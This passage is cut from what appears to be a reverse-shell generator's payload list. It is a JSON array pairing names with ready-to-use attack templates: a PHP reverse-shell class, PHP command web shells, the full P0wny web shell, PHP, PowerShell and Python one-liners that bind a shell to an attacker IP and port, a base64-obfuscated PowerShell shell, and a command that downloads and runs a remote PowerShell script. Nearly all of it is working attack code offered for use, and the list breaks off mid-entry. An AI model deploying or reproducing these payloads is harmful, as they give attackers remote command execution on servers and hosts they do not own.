} else {\n            echo \"DAEMONIZE: Completed successfully!\\n\";\n        }\n        return $exit;\n    }\n    private function settings() {\n        @error_reporting(0);\n        @set_time_limit(0); // do not impose the script execution time limit\n        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories\n    }\n    private function dump($data) {\n        $data = str_replace('<', '&lt;', $data);\n        $data = str_replace('>', '&gt;', $data);\n        echo $data;\n    }\n    private function read($stream, $name, $buffer) {\n        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream\n            $this->error = true;                            // set global error flag\n            echo \"STRM_ERROR: Cannot read from ${name}, script will now exit...\\n\";\n        }\n        return $data;\n    }\n    private function write($stream, $name, $data) {\n        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream\n            $this->error = true;                            // set global error flag\n            echo \"STRM_ERROR: Cannot write to ${name}, script will now exit...\\n\";\n        }\n        return $bytes;\n    }\n    // read/write method for non-blocking streams\n    private function rw($input, $output, $iname, $oname) {\n        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {\n            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length\n            $this->dump($data); // script's dump\n        }\n    }\n    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)\n    // we must read the exact byte length from a stream and not a single byte more\n    private function brw($input, $output, $iname, $oname) {\n        $fstat = fstat($input);\n        $size = $fstat['size'];\n        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {\n            // for some reason Windows OS pipes STDIN into STDOUT\n            // we do not like that\n            // we need to discard the data from the stream\n            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {\n                $this->clen -= $bytes;\n                $size -= $bytes;\n            }\n        }\n        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {\n            $size -= $bytes;\n            $this->dump($data); // script's dump\n        }\n    }\n    public function run() {\n        if ($this->detect() && !$this->daemonize()) {\n            $this->settings();\n\n            // ----- SOCKET BEGIN -----\n            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);\n            if (!$socket) {\n                echo \"SOC_ERROR: {$errno}: {$errstr}\\n\";\n            } else {\n                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS\n\n                // ----- SHELL BEGIN -----\n                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);\n                if (!$process) {\n                    echo \"PROC_ERROR: Cannot start the shell\\n\";\n                } else {\n                    foreach ($pipes as $pipe) {\n                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS\n                    }\n\n                    // ----- WORK BEGIN -----\n                    $status = proc_get_status($process);\n                    @fwrite($socket, \"SOCKET: Shell has connected! PID: \" . $status['pid'] . \"\\n\");\n                    do {\n                        $status = proc_get_status($process);\n                        if (feof($socket)) { // check for end-of-file on SOCKET\n                            echo \"SOC_ERROR: Shell connection has been terminated\\n\"; break;\n                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running\n                            echo \"PROC_ERROR: Shell process has been terminated\\n\";   break; // feof() does not work with blocking streams\n                        }                                                                    // use proc_get_status() instead\n                        $streams = array(\n                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR\n                            'write'  => null,\n                            'except' => null\n                        );\n                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS\n                        if ($num_changed_streams === false) {\n                            echo \"STRM_ERROR: stream_select() failed\\n\"; break;\n                        } else if ($num_changed_streams > 0) {\n                            if ($this->os === 'LINUX') {\n                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN\n                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET\n                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET\n                            } else if ($this->os === 'WINDOWS') {\n                                // order is important\n                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN\n                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET\n                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET\n                            }\n                        }\n                    } while (!$this->error);\n                    // ------ WORK END ------\n\n                    foreach ($pipes as $pipe) {\n                        fclose($pipe);\n                    }\n                    proc_close($process);\n                }\n                // ------ SHELL END ------\n\n                fclose($socket);\n            }\n            // ------ SOCKET END ------\n\n        }\n    }\n}\necho '<pre>';\n// change the host address and/or port number as necessary\n$sh = new Shell('{IP}', {PORT});\n$sh->run();\nunset($sh);\n// garbage collector requires PHP v5.3.0 or greater\n// @gc_collect_cycles();\necho '</pre>';\n?>\n"
    },
    {
      "name": "PHP cmd",
      "command": "<html>\n<body>\n<form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">\n<input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\">\n<input type=\"SUBMIT\" value=\"Execute\">\n</form>\n<pre>\n<?php\n    if(isset($_GET['cmd']))\n    {\n        system($_GET['cmd']);\n    }\n?>\n</pre>\n</body>\n<script>document.getElementById(\"cmd\").focus();</script>\n</html>\n"
    },
    {
      "name": "PHP cmd 2",
      "command": "<?php if(isset($_REQUEST[\"cmd\"])){ echo \"<pre>\"; $cmd = ($_REQUEST[\"cmd\"]); system($cmd); echo \"</pre>\"; die; }?>\n"
    },
    {
      "name": "PHP cmd small",
      "command": "<?=`$_GET[0]`?>"
    },
    {
      "name": "PHP system",
      "command": "php -r '$sock=fsockopen(\"{IP}\",{PORT});system(\"bash <&3 >&3 2>&3\");'\n"
    },
    {
      "name": "PHP `",
      "command": "php -r '$sock=fsockopen(\"{IP}\",{PORT});`bash <&3 >&3 2>&3`;'\n"
    },
    {
      "name": "PHP popen",
      "command": "php -r '$sock=fsockopen(\"{IP}\",{PORT});popen(\"bash <&3 >&3 2>&3\", \"r\");'\n"
    },
    {
      "name": "PHP proc_open",
      "command": "php -r '$sock=fsockopen(\"{IP}\",{PORT});$proc=proc_open(\"bash\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'\n"
    },
    {
      "name": "Windows ConPty",
      "command": "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {IP} {PORT}\n"
    },
    {
      "name": "PowerShell #1",
      "command": "$LHOST = \"{IP}\"; $LPORT = {PORT}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()\n"
    },
    {
      "name": "PowerShell #2",
      "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n"
    },
    {
      "name": "PowerShell #3",
      "command": "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('{IP}', {PORT});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"\n"
    },
    {
      "name": "PowerShell #4 (TLS)",
      "command": "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{IP}', {PORT});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\n"
    },
    {
      "name": "PowerShell #3 (Base64)",
      "command": "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAewBJAFAAfQAiACwAOAA4ADgAOAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
    },
    {
      "name": "P0wny Shell (Webshell)",
      "command": "<?php\n\n$SHELL_CONFIG = array(\n    'username' => 'p0wny',\n    'hostname' => 'shell',\n);\n\nfunction expandPath($path) {\n    if (preg_match(\"#^(~[a-zA-Z0-9_.-]*)(/.*)?$#\", $path, $match)) {\n        exec(\"echo $match[1]\", $stdout);\n        return $stdout[0] . $match[2];\n    }\n    return $path;\n}\n\nfunction allFunctionExist($list = array()) {\n    foreach ($list as $entry) {\n        if (!function_exists($entry)) {\n            return false;\n        }\n    }\n    return true;\n}\n\nfunction executeCommand($cmd) {\n    $output = '';\n    if (function_exists('exec')) {\n        exec($cmd, $output);\n        $output = implode(\"\\n\", $output);\n    } else if (function_exists('shell_exec')) {\n        $output = shell_exec($cmd);\n    } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {\n        ob_start();\n        system($cmd);\n        $output = ob_get_contents();\n        ob_end_clean();\n    } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {\n        ob_start();\n        passthru($cmd);\n        $output = ob_get_contents();\n        ob_end_clean();\n    } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {\n        $handle = popen($cmd, 'r');\n        while (!feof($handle)) {\n            $output .= fread($handle, 4096);\n        }\n        pclose($handle);\n    } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {\n        $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);\n        $output = stream_get_contents($pipes[1]);\n        proc_close($handle);\n    }\n    return $output;\n}\n\nfunction isRunningWindows() {\n    return stripos(PHP_OS, \"WIN\") === 0;\n}\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = \"\";\n\n    if (preg_match(\"/^\\s*cd\\s*(2>&1)?$/\", $cmd)) {\n        chdir(expandPath(\"~\"));\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        chdir(expandPath($match[1]));\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        $stdout = executeCommand($cmd);\n    }\n\n    return array(\n        \"stdout\" => base64_encode($stdout),\n        \"cwd\" => base64_encode(getcwd())\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" => base64_encode(getcwd()));\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    foreach ($files as &$filename) {\n        $filename = base64_encode($filename);\n    }\n    return array(\n        'files' => $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' => base64_encode('File not found / no read permission.'),\n            'cwd' => base64_encode(getcwd())\n        );\n    } else {\n        return array(\n            'name' => base64_encode(basename($filePath)),\n            'file' => base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' => base64_encode('Invalid path / no write permission.'),\n            'cwd' => base64_encode(getcwd())\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' => base64_encode('Done.'),\n            'cwd' => base64_encode(getcwd())\n        );\n    }\n}\n\nfunction initShellConfig() {\n    global $SHELL_CONFIG;\n\n    if (isRunningWindows()) {\n        $username = getenv('USERNAME');\n        if ($username !== false) {\n            $SHELL_CONFIG['username'] = $username;\n        }\n    } else {\n        $pwuid = posix_getpwuid(posix_geteuid());\n        if ($pwuid !== false) {\n            $SHELL_CONFIG['username'] = $pwuid['name'];\n        }\n    }\n\n    $hostname = gethostname();\n    if ($hostname !== false) {\n        $SHELL_CONFIG['hostname'] = $hostname;\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2>/', $cmd)) {\n                $cmd .= ' 2>&1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n} else {\n    initShellConfig();\n}\n\n?><!DOCTYPE html>\n\n<html>\n\n    <head>\n        <meta charset=\"UTF-8\" />\n        <title>p0wny@shell:~#</title>\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <style>\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n                width: 100vw;\n                height: 100vh;\n                overflow: hidden;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n                max-width: calc(100vw - 2 * var(--shell-margin));\n                max-height: calc(100vh - 2 * var(--shell-margin));\n                resize: both;\n                overflow: hidden;\n                width: 100%;\n                height: 100%;\n                margin: var(--shell-margin) auto;\n            }\n\n            #shell-content {\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            :root {\n                --shell-margin: 25px;\n            }\n\n            @media (min-width: 1200px) {\n                :root {\n                    --shell-margin: 50px !important;\n                }\n            }\n\n            @media (max-width: 991px),\n                   (max-height: 600px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n                :root {\n                    --shell-margin: 0 !important;\n                }\n                #shell {\n                    resize: none;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt > span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n                padding: 10px 0;\n            }\n\n            #shell-input > label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n                box-sizing: border-box;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        </style>\n\n        <script>\n            var SHELL_CONFIG = <?php echo json_encode($SHELL_CONFIG); ?>;\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '<span class=\\\"shell-prompt\\\">' + genPrompt(CWD) + '</span> ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(atob(response.name), response.file)\n                        } else {\n                            _insertStdout(atob(response.stdout));\n                            updateCwd(atob(response.cwd));\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length <= 1) return;  // no completion\n                    data.files = data.files.map(function(file){\n                        return atob(file);\n                    });\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(atob(response.stdout));\n                            updateCwd(atob(response.cwd));\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length > 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"à/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return SHELL_CONFIG[\"username\"] + \"@\" + SHELL_CONFIG[\"hostname\"] + \":<span title=\\\"\" + cwd + \"\\\">\" + shortCwd + \"</span>#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = atob(response.cwd);\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&/g, \"&amp;\")\n                    .replace(/</g, \"&lt;\")\n                    .replace(/>/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition > 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition >= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 && xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        </script>\n    </head>\n\n    <body>\n        <div id=\"shell\">\n            <pre id=\"shell-content\">\n                <div id=\"shell-logo\">\n        ___                         ____      _          _ _        _  _   <span></span>\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|<span></span>\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>\n|_|                         |___/  \\____/                                  <span></span>\n                </div>\n            </pre>\n            <div id=\"shell-input\">\n                <label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\">???</label>\n                <div>\n                    <input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/>\n                </div>\n            </div>\n        </div>\n    </body>\n\n</html>\n"
    },
    {
      "name": "Python3 Windows",
      "command": "import os,socket,subprocess,threading;\ndef s2p(s, p):\n    while True:\n        data = s.recv(1024)\n        if len(data) > 0:\n            p.stdin.write(data)\n            p.stdin.flush()\n\ndef p2s(s, p):\n    while True:\n        s.send(p.stdout.read(1))\n\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"{IP}\",{PORT}))\n\np=subprocess.Popen([\"bash\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)\n\ns2p_thread = threading.Thread(target=s2p, args=[s, p])\ns2p_thread.daemon = True\ns2p_thread.start()\n\np2s_thread = threading.Thread(target=p2s, args=[s, p])\np2s_thread.daemon = True\np2s_thread.start()\n\ntry:\n    p.wait()\nexcept KeyboardInterrupt:\n    s.close()\n"
    },
    {
      "name": "node.js #2",
